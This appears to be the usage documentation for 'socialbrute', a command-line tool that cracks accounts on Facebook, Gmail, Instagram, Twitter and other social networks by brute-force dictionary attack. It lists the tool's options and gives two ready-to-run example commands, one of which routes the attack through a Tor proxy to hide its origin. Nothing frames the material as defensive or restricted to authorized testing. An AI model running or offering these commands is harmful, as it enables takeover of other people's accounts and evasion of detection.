=====
Usage
=====

From the `-h` or `--help` help menu: 

.. code-block:: console

  usage: socialbrute [OPTIONS]

    SocialBrute attempts to crack social networks using a brute force dictionary attack.

  Options:
    --use-proxy / --no-proxy        Set a proxy to use
    --proxy-host TEXT               Set the proxy host
    --proxy-port INTEGER            Specify the proxy port
    --proxy-user TEXT               Set the proxy user
    --proxy-pass TEXT               Set the proxy user's password
    -u, --username TEXT             Set the username
    -s, --social [aol|facebook|gmail|hotmail|instagram|twitter|vk|yahoo]
                                    Set the social network
    -w, --wordlist PATH             Set the wordlist path
    -d, --delay INTEGER             Provide the number of seconds the program
                                    delays as each password is tried
    --interactive / --no-interactive
                                    Set the browser emulation interactive
    --help                          Show this message and exit.



**Examples**

Trying to crack a Facebook account:

.. code-block:: console

    $ socialbrute -s facebook -u YOUR_USERNAME -w ~/wordlist.txt

Trying to crack a Twitter account with tor support:

.. code-block:: console

    $ socialbrute -s twitter -u YOUR_USERNAME -w ~/wordlist.txt --use-proxy --proxy-host 127.0.0.1 --proxy-port 9050
